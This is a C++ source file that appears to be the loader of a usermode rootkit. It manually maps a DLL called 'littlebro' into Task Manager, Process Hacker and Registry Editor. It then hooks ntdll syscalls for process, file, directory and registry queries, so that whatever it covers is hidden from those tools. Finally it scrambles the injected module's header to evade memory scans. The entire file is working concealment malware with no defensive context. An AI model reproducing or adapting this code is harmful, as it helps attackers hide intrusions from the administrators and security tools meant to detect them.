#include "stdafx.h"
#include "ntdll.hpp"
#include "rng.hpp"

struct littlehook
{
	std::string module_name;
	std::string function_name;
	std::string hook_name;
};

int main()
{
	// INITIALISE DYNAMIC IMPORTS
	ntdll::initialise();

	// READ LITTLEBRO FROM DISK FOR INJECTION
	const auto littlebro_buffer = binary_file::read_file("littlebro.dll");

	// SETUP HOOK CONTAINER
	// FORMAT: MODULE NAME, FUNCTION NAME, EXPORT NAME
	std::vector<littlehook> container =
	{
		// HOOK *ONLY* SYSCALLS
		{ "ntdll.dll", "NtOpenProcess",				"ntop" },
		{ "ntdll.dll", "NtQuerySystemInformation",	"qsi" },
		{ "ntdll.dll", "NtCreateFile",				"ntcr"},
		{ "ntdll.dll", "NtOpenFile",				"ntopf"},
		{ "ntdll.dll", "NtQueryDirectoryFile",		"ntqdf"},
		{ "ntdll.dll", "NtDeleteValueKey",			"ntdvk" }
	};


	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe", "regedit.exe"/*, "explorer.exe"*/ })
	{
		auto process_list = process::get_all_from_name(process_name);

		if (process_list.empty()) // NO PROCESSES FOUND
			continue;

		// ENUMERATE ALL PROCESSES
		for (auto id : process_list)
		{
			logger::log_formatted("Target Process", process_name);

			// MAP LITTLEBRO INTO TARGET PROCESS
			auto proc = process(id, PROCESS_ALL_ACCESS);

			if (!proc)
			{
				logger::log_error("Non-sufficient elevation, aborting");
				continue;
			}

			auto littlebro = injection::manualmap(proc).inject(littlebro_buffer);

			// HOOK FUNCTIONS
			for (const auto& hook_data : container)
				proc.detour_function(hook_data.module_name, hook_data.function_name, littlebro, hook_data.hook_name.c_str());

			// FILL HEADER SECTION WITH PSEUDO-RANDOM DATA WITH HIGH ENTROPY
			auto junk_buffer = std::vector<std::uint8_t>(0x1000);
			std::generate(junk_buffer.begin(), junk_buffer.end(), [] { return static_cast<uint8_t>(rng::get_int<uint16_t>(0x00, 0xFF)); }); 
			proc.write_raw_memory(junk_buffer.data(), 0x1000, littlebro);
		}
	}

	logger::log("Finished!");
	std::cin.get();
	return 0;
}

